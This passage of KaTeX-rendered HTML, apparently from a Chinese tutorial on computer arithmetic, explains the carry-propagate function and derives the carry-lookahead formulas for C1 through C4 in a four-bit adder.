style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">C_{i-1} = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">C_i = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。可视为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub><mo>⊕</mo><msub><mi>B</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">A_i \oplus B_i = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，第 <code>i - 1</code> 位的进位信号 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">C_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span> 可以通过本位向高位传送。因此称 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub><mo>⊕</mo><msub><mi>B</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">A_i \oplus B_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为进位传递函数（进位传递条件），用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">P_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 表示。</p>
<p>将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">G_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">P_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 代入前面 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>∽</mo><msub><mi>C</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">C_1 \backsim C_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">∽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的公式，可得</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.16em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><msub><mi>G</mi><mn>1</mn></msub><mo>+</mo><msub><mi>P</mi><mn>1</mn></msub><msub><mi>C</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><msub><mi>G</mi><mn>2</mn></msub><mo>+</mo><msub><mi>P</mi><mn>2</mn></msub><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><msub><mi>G</mi><mn>2</mn></msub><mo>+</mo><msub><mi>P</mi><mn>2</mn></msub><msub><mi>G</mi><mn>1</mn></msub><mo>+</mo><msub><mi>P</mi><mn>2</mn></msub><msub><mi>P</mi><mn>1</mn></msub><msub><mi>C</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>3</mn></msub><mo>=</mo><msub><mi>G</mi><mn>3</mn></msub><mo>+</mo><msub><mi>P</mi><mn>3</mn></msub><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><msub><mi>G</mi><mn>3</mn></msub><mo>+</mo><msub><mi>P</mi><mn>3</mn></msub><msub><mi>G</mi><mn>2</mn></msub><mo>+</mo><msub><mi>P</mi><mn>3</mn></msub><msub><mi>P</mi><mn>2</mn></msub><msub><mi>G</mi><mn>1</mn></msub><mo>+</mo><msub><mi>P</mi><mn>3</mn></msub><msub><mi>P</mi><mn>2</mn></msub><msub><mi>P</mi><mn>1</mn></msub><msub><mi>C</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>4</mn></msub><mo>=</mo><msub><mi>G</mi><mn>4</mn></msub><mo>+</mo><msub><mi>P</mi><mn>4</mn></msub><msub><mi>C</mi><mn>3</mn></msub><mo>=</mo><msub><mi>G</mi><mn>4</mn></msub><mo>+</mo><msub><mi>P</mi><mn>4</mn></msub><msub><mi>G</mi><mn>3</mn></msub><mo>+</mo><msub><mi>P</mi><mn>4</mn></msub><msub><mi>P</mi><mn>3</mn></msub><msub><mi>G</mi><mn>2</mn></msub><mo>+</mo><msub><mi>P</mi><mn>4</mn></msub><msub><mi>P</mi><mn>3</mn></msub><msub><mi>P</mi><mn>2</mn></msub><msub><mi>G</mi><mn>1</mn></msub><mo>+</mo><msub><mi>P</mi><mn>4</mn></msub><msub><mi>P</mi><mn>3</mn></msub><msub><mi>P</mi><mn>2</mn></msub><msub><mi>P</mi><mn>1</mn></msub><msub><mi>C</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">
\begin{matrix*}[l]
C_1 = G_1 + P_1C_0 \\
C_2 = G_2 + P_2C_1 = G_2 + P_2G_1 + P_2P_1C_0 \\
C_3 = G_3 + P_3C_2 = G_3 + P_3G_2 + P_3P_2G_1 + P_3P_2P_1C_0 \\
C_4 = G_4 + P_4C_3 = G_4 + P_4G_3 + P_4P_3G_2 + P_4P_3P_2G_1 + P_4P_3P_2P_1C_0
\end{matrix*}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.8em;vertical-align:-2.15em;"></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 